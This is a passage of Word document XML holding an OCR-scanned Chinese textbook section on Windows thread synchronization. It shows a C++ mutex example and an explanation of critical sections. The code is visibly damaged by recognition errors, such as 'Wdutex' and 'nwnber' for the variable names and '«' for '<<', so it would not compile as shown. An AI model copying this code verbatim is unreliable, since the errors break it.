      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= 1; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>〃定</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>义全局変里</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">HANDLE hNutex; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>//定义互斥对象句柄</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2245"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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ThreadProcl (void* lp)</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240" w:lineRule="auto"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>WaitForSingleObject (Mbitex, INFINITE);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout « "thread 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>"«number « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>++nwnber;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.sleep (100)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ReleaseMutex(Wdutex)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</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280" w:line="330" w:lineRule="exact"/>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tabs>
          <w:tab w:val="left" w:pos="2245"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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ThreadProc2 (void* lp)</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520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>WaitForSingleObject (Mbitex, INFINITE)</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30" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout « "thread 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>"«number « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>++nwnber：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>.sleep (100)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ReleaseMutex(Wdutex)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="11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280" w:line="330" w:lineRule="exact"/>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330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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tabs>
          <w:tab w:val="left" w:pos="5420"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Wdutex = Great eMutex (NULL, false, "mutex") </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>创建互斥对象</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Cr eat eThread (NULL, 0, ThreadProcl, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Great eThread (NULL, 0, ThreadProc2, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sleep (10*1000);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>system ("pause");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="330" w:lineRule="exact"/>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720" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="242" w:name="bookmark251"/>
      <w:bookmarkEnd w:id="242"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>临界区</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>临界区</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(Critical Section)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一段独占对某些共享资源访问的代码，在任意时刻只允 许一个线程对共享资源进行访问。如果有多个线程试图同时访问临界区，那么在有一个 线程进入后其他所有试图访问此临界区的线程将被挂起</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>并一直持续到进入临界区的线</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="6495"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="277" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:hanging="2180"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> 程离开。临界区在被释放后，其他线程可以继续抢占，并以此达到用原子方式操作共享 资源的目的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>临界区在使用时以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CRITICAL_SECTICN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">结构对象保护共享箜源，并分别用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EnterCriticalSection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">()和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">LeaveCriticalSection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">()函数去标识和释放一个临界 区。所用到的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">CRITICAL_SECTION </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">结构对象必须经过 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">InitializeCriticalSection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>() 的初始化后才能使用，而且必须确保所有銭程中的任何试图访问此共享资源的代码都处 在此临界区的保护之下。否则临界区将不会起到应有的作用，共享资源依然有被破坏的 可能。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>•include "stdafx. h"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^include〈windows. h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include&lt;i ostream,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="80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0" w:line="318" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int number = 1; //</w:t>
      </w:r>
      <w:r>
        <w:rPr>
